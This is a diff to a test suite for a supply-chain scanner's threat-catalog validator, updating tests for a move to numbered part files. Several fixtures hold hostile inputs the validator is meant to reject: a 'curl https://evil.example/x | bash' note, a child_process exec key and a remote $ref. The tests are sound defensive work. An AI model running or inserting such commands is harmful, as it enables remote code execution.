@@ -713,7 +713,7 @@ describe("isInertThreatCatalogFile", () => {
   it("accepts a well-formed catalog at the exact project path", async () => {
     const { isInertThreatCatalogFile } = await import("../threat-intel.js");
     const body = `${line()}\n${line({ value: "other@2.0.0" })}\n`;
-    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", body)).toBe(true);
+    expect(isInertThreatCatalogFile("data/threat-catalog/part-000.jsonl", body)).toBe(true);
   });
 
   // The exemption is bound to the path, not the basename. A basename match
@@ -724,10 +724,17 @@ describe("isInertThreatCatalogFile", () => {
     const { isInertThreatCatalogFile } = await import("../threat-intel.js");
     const body = line();
     for (const p of [
-      "threat-catalog.jsonl",
-      "vendor/deep/threat-catalog.jsonl",
-      "src/data/threat-catalog.jsonl",
-      "data/sub/threat-catalog.jsonl",
+      "part-000.jsonl",
+      "threat-catalog/part-000.jsonl",
+      "vendor/deep/data/threat-catalog/part-000.jsonl",
+      "src/data/threat-catalog/part-000.jsonl",
+      "data/threat-catalog/sub/part-000.jsonl",
+      "data/threat-catalog/part-0.jsonl",
+      "data/threat-catalog/part-0000.jsonl",
+      "data/threat-catalog/part-000.jsonl.bak",
+      "data/threat-catalog/part-abc.jsonl",
+      // The single-file layout before the split is no longer the store.
+      "data/threat-catalog.jsonl",
     ]) {
       expect(isInertThreatCatalogFile(p, body)).toBe(false);
     }
@@ -739,7 +746,7 @@ describe("isInertThreatCatalogFile", () => {
   it("rejects a free-text note, even on an otherwise valid entry", async () => {
     const { isInertThreatCatalogFile } = await import("../threat-intel.js");
     const withNote = line({ note: "curl https://evil.example/x | bash" });
-    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", withNote)).toBe(false);
+    expect(isInertThreatCatalogFile("data/threat-catalog/part-000.jsonl", withNote)).toBe(false);
   });
 
   // Key-and-scalar checking alone accepts objects the loader would quarantine.
@@ -749,16 +756,16 @@ describe("isInertThreatCatalogFile", () => {
     const { isInertThreatCatalogFile, isValidFeedIOC } = await import("../threat-intel.js");
     const noSeverity = JSON.stringify({ type: "package", value: "bad@1", firstSeen: "2020-01-01" });
     expect(isValidFeedIOC(JSON.parse(noSeverity))).toBe(false);
-    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", noSeverity)).toBe(false);
+    expect(isInertThreatCatalogFile("data/threat-catalog/part-000.jsonl", noSeverity)).toBe(false);
 
     const badSeverity = line({ severity: "catastrophic" });
-    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", badSeverity)).toBe(false);
+    expect(isInertThreatCatalogFile("data/threat-catalog/part-000.jsonl", badSeverity)).toBe(false);
   });
 
   it("accepts an empty catalog, which is the Phase 1 state", async () => {
     const { isInertThreatCatalogFile } = await import("../threat-intel.js");
-    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", "")).toBe(true);
-    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", "\n\n")).toBe(true);
+    expect(isInertThreatCatalogFile("data/threat-catalog/part-000.jsonl", "")).toBe(true);
+    expect(isInertThreatCatalogFile("data/threat-catalog/part-000.jsonl", "\n\n")).toBe(true);
   });
 
   it("rejects any other filename, even with a valid body", async () => {
@@ -770,26 +777,26 @@ describe("isInertThreatCatalogFile", () => {
   it("rejects a line carrying a key outside the entry allowlist", async () => {
     const { isInertThreatCatalogFile } = await import("../threat-intel.js");
     const body = `${line()}\n${line({ exec: "require('child_process')" })}\n`;
-    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", body)).toBe(false);
+    expect(isInertThreatCatalogFile("data/threat-catalog/part-000.jsonl", body)).toBe(false);
   });
 
   it("rejects a non-scalar value", async () => {
     const { isInertThreatCatalogFile } = await import("../threat-intel.js");
     const body = line({ value: { $ref: "http://evil.example" } });
-    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", body)).toBe(false);
+    expect(isInertThreatCatalogFile("data/threat-catalog/part-000.jsonl", body)).toBe(false);
   });
 
   it("rejects a line that is not a JSON object", async () => {
     const { isInertThreatCatalogFile } = await import("../threat-intel.js");
-    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", "not json")).toBe(false);
-    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", "[1,2,3]")).toBe(false);
-    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", "null")).toBe(false);
+    expect(isInertThreatCatalogFile("data/threat-catalog/part-000.jsonl", "not json")).toBe(false);
+    expect(isInertThreatCatalogFile("data/threat-catalog/part-000.jsonl", "[1,2,3]")).toBe(false);
+    expect(isInertThreatCatalogFile("data/threat-catalog/part-000.jsonl", "null")).toBe(false);
   });
 
   it("rejects when only ONE line of many is malformed", async () => {
     const { isInertThreatCatalogFile } = await import("../threat-intel.js");
     const body = `${line()}\n${line()}\nnot json\n${line()}\n`;
-    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", body)).toBe(false);
+    expect(isInertThreatCatalogFile("data/threat-catalog/part-000.jsonl", body)).toBe(false);
   });
 
   // The guard above is INSURANCE, not a fix for a live problem, and this test
@@ -805,10 +812,10 @@ describe("isInertThreatCatalogFile", () => {
   // facts together so the relationship cannot silently break.
   it("stays safe whether or not .jsonl becomes scannable", async () => {
     const { SCANNABLE_EXTENSIONS } = await import("../patterns.js");
-    const { isInertThreatCatalogFile, CATALOG_FILE } = await import("../threat-intel.js");
+    const { isInertThreatCatalogFile, CATALOG_DIR } = await import("../threat-intel.js");
 
     const scannable = SCANNABLE_EXTENSIONS.has(".jsonl");
-    const guarded = isInertThreatCatalogFile(`data/${CATALOG_FILE}`, line());
+    const guarded = isInertThreatCatalogFile(`${CATALOG_DIR}/part-000.jsonl`, line());
 
     // Safe if the extension is not scanned, or if the guard recognizes the
     // catalog. Both are true today; either one alone is enough.
@@ -821,7 +828,7 @@ describe("isInertThreatCatalogFile", () => {
 
   it("normalizes Windows path separators", async () => {
     const { isInertThreatCatalogFile } = await import("../threat-intel.js");
-    expect(isInertThreatCatalogFile("data\\threat-catalog.jsonl", line())).toBe(true);
+    expect(isInertThreatCatalogFile("data\\threat-catalog\\part-000.jsonl", line())).toBe(true);
   });
 
   // The exemption is bound to the repository-relative path, so it applies only
@@ -832,17 +839,33 @@ describe("isInertThreatCatalogFile", () => {
   // basename evasion, and this test pins it so it stays deliberate.
   it("does not apply when the scan root is above the repository", async () => {
     const { isInertThreatCatalogFile } = await import("../threat-intel.js");
-    expect(isInertThreatCatalogFile("supply-chain-guard/data/threat-catalog.jsonl", line()))
+    expect(isInertThreatCatalogFile("supply-chain-guard/data/threat-catalog/part-000.jsonl", line()))
       .toBe(false);
-    expect(isInertThreatCatalogFile("workspace/repo/data/threat-catalog.jsonl", line()))
+    expect(isInertThreatCatalogFile("workspace/repo/data/threat-catalog/part-001.jsonl", line()))
       .toBe(false);
   });
 
-  it("matches the path constant the scanner exports", async () => {
-    const { CATALOG_RELATIVE_PATH, isInertThreatCatalogFile } = await import("../threat-intel.js");
-    expect(CATALOG_RELATIVE_PATH).toBe("data/threat-catalog.jsonl");
-    expect(isInertThreatCatalogFile(CATALOG_RELATIVE_PATH, line())).toBe(true);
+  it("matches the store the scripts write", async () => {
+    const { CATALOG_DIR, isInertThreatCatalogFile } = await import("../threat-intel.js");
+    const store = await import("../../scripts/catalog-store.mjs");
+    expect(CATALOG_DIR).toBe(store.CATALOG_DIR);
+    for (const i of [0, 1, 2, 57]) {
+      expect(isInertThreatCatalogFile(store.catalogPartPath(i), line())).toBe(true);
+    }
   });
+
+  // Every committed part, as it is on disk, must be recognized: a part the
+  // exemption missed would flood a self-scan once .jsonl becomes scannable.
+  it("recognizes every committed catalog part", async () => {
+    const { isInertThreatCatalogFile } = await import("../threat-intel.js");
+    const store = await import("../../scripts/catalog-store.mjs");
+    const repoRoot = path.resolve(__dirname, "..", "..");
+    const parts = store.listCatalogParts(repoRoot);
+    expect(parts.length).toBeGreaterThan(0);
+    for (const part of parts) {
+      expect(isInertThreatCatalogFile(part, fs.readFileSync(path.join(repoRoot, part), "utf8"))).toBe(true);
+    }
+  }, 120_000);
 });
 
 // ---------------------------------------------------------------------------
